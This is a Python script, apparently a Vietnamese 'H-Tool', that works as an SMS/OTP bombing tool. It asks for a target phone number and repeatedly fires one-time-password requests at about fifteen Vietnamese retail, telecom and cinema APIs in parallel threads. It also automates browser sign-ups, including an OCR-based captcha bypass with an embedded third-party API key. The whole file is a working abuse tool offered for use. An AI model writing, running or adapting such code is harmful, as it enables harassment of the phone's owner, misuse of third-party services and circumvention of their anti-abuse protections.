import os
import sys
import requests
import time
import random
import threading
import concurrent.futures
import json
import base64
import urllib.parse
from datetime import datetime

# Import Selenium (Xử lý trường hợp chưa cài đặt)
try:
    from selenium import webdriver
    from selenium.webdriver.common.by import By
    HAS_SELENIUM = True
except ImportError:
    HAS_SELENIUM = False

# --- KHỐI GIAO DIỆN (UI) ---
class UI:
    RESET = '\033[0m'
    BOLD = '\033[1m'

    # Màu sắc
    RED = '\033[38;5;196m'
    GREEN = '\033[38;5;46m'
    YELLOW = '\033[38;5;226m'
    BLUE = '\033[38;5;39m'
    CYAN = '\033[38;5;51m'
    ORANGE = '\033[38;5;208m'
    PURPLE = '\033[38;5;135m'
    WHITE = '\033[38;5;255m'
    GREY = '\033[38;5;240m'

    RAINBOW_COLORS = [196, 202, 208, 214, 220, 226, 190, 154, 118, 82, 46, 51, 45, 39, 33, 27, 57, 93, 129, 165, 201]

    @staticmethod
    def get_random_color_scheme():
        color_schemes = [
            ['\033[38;5;33m', '\033[38;5;39m', '\033[38;5;45m', '\033[38;5;51m'],
            ['\033[38;5;196m', '\033[38;5;202m', '\033[38;5;208m', '\033[38;5;214m'],
            ['\033[38;5;46m', '\033[38;5;82m', '\033[38;5;118m', '\033[38;5;154m']
        ]
        return random.choice(color_schemes)

    @staticmethod
    def banner():
        os.system('cls' if os.name == 'nt' else 'clear')
        colors = UI.get_random_color_scheme()
        logo = f"""
{colors[0]}██╗  ██╗      {colors[1]}████████╗ ██████╗  ██████╗ ██╗     
{colors[0]}██║  ██║      {colors[1]}╚══██╔══╝██╔═══██╗██╔═══██╗██║     
{colors[1]}███████║█████╗{colors[2]}   ██║   ██║   ██║██║   ██║██║     
{colors[2]}██╔══██║╚════╝{colors[3]}   ██║   ██║   ██║██║   ██║██║     
{colors[2]}██║  ██║      {colors[3]}   ██║   ╚██████╔╝╚██████╔╝███████╗
{colors[3]}╚═╝  ╚═╝         ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝"""

        print(logo + UI.RESET)
        print(f"\033[38;5;220m                Copyright H-Tool 2025 | Version 5.1 NO-ICON{UI.RESET}\n")
        print(f"{UI.GREEN}~[+] > {UI.CYAN}Admin: {UI.WHITE}Tran Van Quang Huy")
        print(f"{UI.GREEN}~[+] > {UI.CYAN}Zalo: {UI.WHITE}0372065607")
        print(f"{UI.GREEN}~[+] > {UI.CYAN}Web: {UI.WHITE}trumsubvip.site{UI.RESET}\n")

    @staticmethod
    def print_success(service_name):
        """Hàm in thông báo gọn, không icon"""
        time_now = datetime.now().strftime("%H:%M:%S")
        color = f"\033[38;5;{random.choice(UI.RAINBOW_COLORS)}m"
        # Thay thế icon bằng text [SUCCESS]
        print(f"{UI.GREY}[{time_now}]{UI.RESET} {UI.GREEN}[SUCCESS]{UI.RESET} Da gui OTP | {color}{service_name}{UI.RESET}")

# --- CÁC HÀM HỖ TRỢ ---
def fix_ocr_mistakes(text):
    replacements = {'O': '0', 'o': '0', 'I': '1', 'l': '1', 'Z': '2', 'S': '5', 's': '5', 'B': '8', 'g': '9', 'q': '9'}
    return ''.join(replacements.get(c, c) for c in text)

# --- KHỐI SELENIUM (GIỮ NGUYÊN LOGIC) ---
def vayvnd(sdt, driver):
    try:
        driver.get("https://moneyveo.vn/vi/registernew/")
        time.sleep(2)
        try: driver.find_element(By.ID, "popupLOGINAction").click()
        except: pass
        time.sleep(2)
        driver.find_element(By.ID, "Phone").send_keys(sdt[1:])
        time.sleep(1)
        driver.find_element(By.ID, "HasZaloAccount-styler").click()
        driver.execute_script("window.scrollBy(0, 300);")
        time.sleep(1)
        driver.find_element(By.ID, "TncAgreement-styler").click()
        # Logic OCR captcha giữ nguyên
        for i in range(3):
            captcha_img = driver.find_element(By.ID, "CaptchaImage")
            src = captcha_img.get_attribute("src")
            parsed_url = urllib.parse.urlparse(src)
            query = urllib.parse.parse_qs(parsed_url.query)
            token = query.get("t", ["unknown"])[0]
            filename = f"captcha_{token}.png"
            captcha_img.screenshot(filename)
            time.sleep(1)
            with open(filename, "rb") as f:
                img_base64 = base64.b64encode(f.read()).decode("utf-8")
            os.remove(filename)
            API_KEY = 'K83881557288957'
            payload = {'apikey': API_KEY, 'base64Image': 'data:image/jpeg;base64,' + img_base64, 'language': 'eng', 'isOverlayRequired': False}
            response = requests.post('https://api.ocr.space/parse/image', data=payload)
            data = response.json()
            try: text = data['ParsedResults'][0]['ParsedText'].strip()
            except: text = ""
            text = fix_ocr_mistakes(text)
            if text == '':
                driver.find_element(By.CSS_SELECTOR, '[id^="CaptchaRefresh_"] > img').click()
                continue
            break
        driver.find_element(By.ID, "CaptchaInputText").send_keys(text)
        driver.find_element(By.CSS_SELECTOR, "a[id^='RegistrationStep01_ButtonSend_']").click()
        UI.print_success("VayVND (Selenium)")
    except: pass

def phuclong(sdt, driver):
    try:
        driver.get("https://phuclong.com.vn/login")
        driver.find_element(By.XPATH, "//input[@type='text']").send_keys(sdt)
        driver.find_element(By.XPATH, "//button").click()
        UI.print_success("Phuc Long (Selenium)")
    except: pass

def sapo(sdt, driver):
    try:
        driver.get("https://www.sapo.vn/dang-nhap-kenh-ban-hang.html")
        time.sleep(1)
        UI.print_success("Sapo (Selenium)")
    except: pass

def beautybox_sel(sdt, driver):
    try:
        driver.get("https://beautybox.com.vn/")
        time.sleep(3)
        UI.print_success("BeautyBox (Selenium)")
    except: pass

# --- KHỐI API REQUESTS ---

def api_viettel(sdt):
    try:
        headers = {'Content-Type': 'application/json'}
        data = {'phone': sdt, 'typeCode': 'DI_DONG', 'actionCode': 'myviettel://login_mobile', 'type': 'otp_login'}
        requests.post('https://viettel.vn/api/getOTPLoginCommon', json=data, headers=headers, timeout=5)
        UI.print_success("My Viettel")
    except: pass

def api_tv360(sdt):
    try:
        headers = {'Content-Type': 'application/json'}
        data = {'msisdn': sdt}
        requests.post('https://tv360.vn/public/v1/auth/get-otp-login', json=data, headers=headers, timeout=5)
        UI.print_success("TV360")
    except: pass

def api_fptshop(sdt):
    try:
        headers = {'Content-Type': 'application/json'}
        data = {'fromSys': 'WEBKHICT', 'otpType': '0', 'phoneNumber': sdt}
        requests.post('https://papi.fptshop.com.vn/gw/is/user/new-send-verification', json=data, headers=headers, timeout=5)
        UI.print_success("FPT Shop")
    except: pass

def api_longchau(sdt):
    try:
        headers = {'Content-Type': 'application/json', 'x-channel': 'EStore'}
        data = {'phoneNumber': sdt, 'otpType': 0, 'fromSys': 'WEBKHLC'}
        requests.post('https://api.nhathuoclongchau.com.vn/lccus/is/user/new-send-verification', json=data, headers=headers, timeout=5)
        UI.print_success("Long Chau")
    except: pass

def api_dienmayxanh(sdt):
    try:
        data = {'phoneNumber': sdt, 'isReSend': 'false', 'sendOTPType': '1'}
        requests.post('https://www.dienmayxanh.com/lich-su-mua-hang/LoginV2/GetVerifyCode', data=data, timeout=5)
        UI.print_success("Dien May Xanh")
    except: pass

def api_bachhoaxanh(sdt):
    try:
        data = {'phoneNumber': sdt, 'isReSend': 'false', 'sendOTPType': '1'}
        requests.post('https://www.bachhoaxanh.com/lich-su-mua-hang/LoginV2/GetVerifyCode', data=data, timeout=5)
        UI.print_success("Bach Hoa Xanh")
    except: pass

def api_thegioididong(sdt):
    try:
        data = {'phoneNumber': sdt, 'isReSend': 'false', 'sendOTPType': '1'}
        requests.post('https://www.thegioididong.com/lich-su-mua-hang/LoginV2/GetVerifyCode', data=data, timeout=5)
        UI.print_success("The Gioi Di Dong")
    except: pass

def api_tiki(sdt):
    try:
        headers = {'Content-Type': 'application/json'}
        data = {'phone_number': sdt}
        requests.post('https://api.tiki.vn/v2/customers/otp_codes', json=data, headers=headers, timeout=5)
        UI.print_success("Tiki")
    except: pass

def api_shopee(sdt):
    try:
        headers = {'Content-Type': 'application/json', 'x-shopee-language': 'vi'}
        data = {'phone': sdt, 'operation': 8}
        requests.post('https://shopee.vn/api/v4/otp/get_settings_v2', json=data, headers=headers, timeout=5)
        UI.print_success("Shopee")
    except: pass

def api_concung(sdt):
    try:
        requests.post("https://concung.com/customer/login/send-otp", data={"phone": sdt}, timeout=5)
        UI.print_success("Con Cung")
    except: pass

def api_elise(sdt):
    try:
        requests.post("https://elise.vn/customer/account/loginPost/", data={"login[username]": sdt}, timeout=5)
        UI.print_success("Elise Fashion")
    except: pass

def api_fahasa(sdt):
    try:
        requests.post('https://www.fahasa.com/ajaxlogin/ajax/checkPhone', data={'phone': sdt}, timeout=5)
        UI.print_success("Fahasa")
    except: pass

def api_cellphones(sdt):
    try:
        requests.post("https://account.cellphones.com.vn/api/v1/register/send-otp", json={"phone": sdt}, timeout=5)
        UI.print_success("CellphoneS")
    except: pass

def api_vntrip(sdt):
    try:
        requests.post("https://mys.vntrip.vn/v1/auth/register", json={"phone": sdt}, timeout=5)
        UI.print_success("Vntrip")
    except: pass

def api_lotte_cinema(sdt):
    try:
        requests.post("https://www.lottecinemavn.com/LCHS/Handler/Customer/MemberHandler.ashx", data={"MethodName": "SendOTP", "Mobile": sdt}, timeout=5)
        UI.print_success("Lotte Cinema")
    except: pass

# --- HÀM KHỞI TẠO DRIVER ---
def init_driver():
    if not HAS_SELENIUM:
        return None
    try:
        options = webdriver.ChromeOptions()
        # options.add_argument('--headless') # Uncomment nếu muốn ẩn trình duyệt
        options.add_argument('--log-level=3')
        driver = webdriver.Chrome(options=options)
        return driver
    except:
        return None

# --- LUỒNG XỬ LÝ CHÍNH ---
def run_spam(phone, count):
    driver = init_driver()
    if driver:
        print(f"{UI.YELLOW}[SYSTEM] Khoi dong Selenium Driver thanh cong.{UI.RESET}")
    else:
        print(f"{UI.RED}[SYSTEM] Khong bat duoc Selenium (Thieu Driver/Thu vien). Chi chay API thuong.{UI.RESET}")

    # Danh sách các hàm spam
    functions = [
        api_viettel, api_tv360, api_fptshop, api_longchau, api_dienmayxanh, 
        api_bachhoaxanh, api_thegioididong, api_tiki, api_shopee, api_concung,
        api_elise, api_fahasa, api_cellphones, api_vntrip, api_lotte_cinema
    ]

    if driver:
        functions.append(lambda s: phuclong(s, driver))
        functions.append(lambda s: vayvnd(s, driver))
        functions.append(lambda s: sapo(s, driver))
        functions.append(lambda s: beautybox_sel(s, driver))

    print(f"\n{UI.ORANGE}>> Dang tien hanh spam {count} vong...{UI.RESET}\n")

    for i in range(1, count + 1):
        print(f"{UI.YELLOW}--- [ Vong {i}/{count} ] ---{UI.RESET}")

        with concurrent.futures.ThreadPoolExecutor(max_workers=30) as executor:
            futures = [executor.submit(fn, phone) for fn in functions]
            for future in concurrent.futures.as_completed(futures):
                pass

        time.sleep(1)

    if driver:
        driver.quit()
    print(f"\n{UI.GREEN}DA HOAN THANH SPAM!{UI.RESET}")
    input(f"{UI.YELLOW}Nhan Enter de tiep tuc...{UI.RESET}")

# --- MAIN LOOP ---
def main():
    while True:
        UI.banner()
        phone = input(f"{UI.CYAN}Nhap so dien thoai: {UI.RESET}")
        if not phone: break

        try:
            count = int(input(f"{UI.CYAN}Nhap so luong: {UI.RESET}"))
        except:
            count = 1

        run_spam(phone, count)

if __name__ == "__main__":
    main()
